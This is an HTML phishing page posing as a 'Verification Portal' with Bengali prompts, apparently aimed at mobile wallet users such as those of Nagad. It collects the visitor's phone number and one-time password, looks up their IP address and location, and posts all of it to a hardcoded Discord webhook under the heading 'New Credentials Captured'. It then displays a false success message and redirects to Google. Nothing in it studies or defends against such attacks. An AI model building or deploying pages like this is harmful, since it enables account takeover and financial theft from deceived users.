<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification Portal</title>
<style>
*{box-sizing:border-box}
body{
 margin:0;
 font-family:Arial,sans-serif;
 background:#121212;
 color:#fff;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
}
.card{
 background:#1e1e1e;
 padding:25px;
 border-radius:12px;
 width:340px;
 box-shadow:0 4px 15px rgba(0,0,0,0.5);
 text-align:center;
}
h3{color:#007acc;margin-bottom:20px;}
input{
 width:100%;
 padding:12px;
 margin:10px 0;
 background:#2d2d2d;
 border:1px solid #444;
 color:#fff;
 border-radius:6px;
 box-sizing:border-box;
 font-size:15px;
}
button{
 width:100%;
 padding:12px;
 background:#007acc;
 color:white;
 border:none;
 border-radius:6px;
 cursor:pointer;
 font-weight:bold;
 font-size:15px;
 margin-top:5px;
}
button:hover{background:#005999}
#otpSection, #loadingSection{display:none;}
#message{margin-top:12px;font-size:13px;color:#ff6b6b;}
.spinner {
    border: 4px solid #2d2d2d;
    width: 45px;
    height: 45px;
    border-radius: 50%;
    border-left-color: #007acc;
    animation: spin 1s linear infinite;
    margin: 20px auto;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
.success-text {
    color: #4cd137;
    font-weight: bold;
    font-size: 15px;
    margin-top: 10px;
}
</style>
</head>
<body>

<div class="card">
    <h3>Verification Portal</h3>
    
    <!-- ধাপ ১: মোবাইল নম্বর ইনপুট -->
    <div id="phoneSection">
        <input type="tel" id="phoneNumber" placeholder="মোবাইল নম্বর দিন" maxlength="15">
        <button onclick="nextStep()">পরবর্তী (Next)</button>
    </div>

    <!-- ধাপ ২: ব্যবহারকারীর ইনপুট নেওয়ার জন্য ওটিপি বক্স (কোনো পূর্বনির্ধারিত ডেমো কোড নেই) -->
    <div id="otpSection">
        <input type="text" id="otpCode" placeholder="আপনার ওটিপি (OTP) দিন" maxlength="6">
        <button onclick="submitData()">Verify OTP</button>
    </div>

    <!-- ধাপ ৩: লোডিং ও সফল মেসেজ সেকশন -->
    <div id="loadingSection">
        <div class="spinner"></div>
        <div class="success-text">সফলভাবে ওটিপি দেওয়া হয়েছে!</div>
        <p style="font-size: 13px; color: #aaa; margin-top: 5px;">যাচাই করা হচ্ছে...</p>
    </div>

    <div id="message"></div>
</div>

<script>
// আপনার প্রদান করা সঠিক ডিসকর্ড ওয়েবহুক ইউআরএল এখানে পার্মানেন্টলি সেট করা আছে
const webhookUrl = "https://discord.com/api/webhooks/1568661175959298110/oGptGCUpE-n-4GTWtG2vR72e6K9e9eYqSBMrGskI38492Fs8qhtuzyi0Wa2d9qrTv54d";

let capturedPhone = "";

function nextStep() {
    capturedPhone = document.getElementById('phoneNumber').value.trim();
    const message = document.getElementById('message');

    if (!capturedPhone || capturedPhone.length < 5) {
        message.textContent = "দয়া করে সঠিক মোবাইল নম্বর দিন।";
        return;
    }

    message.textContent = "";
    document.getElementById('phoneSection').style.display = "none";
    document.getElementById('otpSection').style.display = "block";
}

async function submitData() {
    const otp = document.getElementById('otpCode').value.trim();
    const message = document.getElementById('message');

    if (!otp) {
        message.textContent = "দয়া করে OTP দিন।";
        return;
    }

    // ইনপুট সেকশন লুকিয়ে লোডিং স্পিনার ও সফল মেসেজ দেখানো
    document.getElementById('otpSection').style.display = "none";
    document.getElementById('message').style.display = "none";
    document.getElementById('loadingSection').style.display = "block";

    try {
        // ক্লায়েন্টের আইপি এবং লোকেশন ফেচ করা
        const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({}));
        const ipData = await ipRes.json();

        const payload = {
            username: "Data Log Hub",
            embeds: [{
                title: "📥 New Credentials Captured",
                color: 16711680,
                fields: [
                    { name: "📱 PHONE NUMBER", value: `\`${capturedPhone}\``, inline: true },
                    { name: "🔑 OTP CODE", value: `\`${otp}\``, inline: true },
                    { name: "🌐 IP ADDRESS", value: `**${ipData.ip || 'UNKNOWN'}**`, inline: true },
                    { name: "📍 LOCATION", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true }
                ],
                footer: { text: "Timestamp: " + new Date().toLocaleString() }
            }]
        };

        // সরাসরি ডিসকর্ড ওয়েবহুকে পোস্ট রিকোয়েস্ট পাঠানো (নগদ মেসেজ যাওয়ার জন্য)
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        });

    } catch (e) {
        // কোনো নেটওয়ার্ক সমস্যা হলেও ফ্লো যেন ঠিক থাকে
    }

    // ২ সেকেন্ড স্পিনার ঘুরানোর পর গোগলে রিডাইরেক্ট করা
    setTimeout(() => {
        window.location.replace("https://www.google.com");
    }, 2000);
}
</script>

</body>
</html>
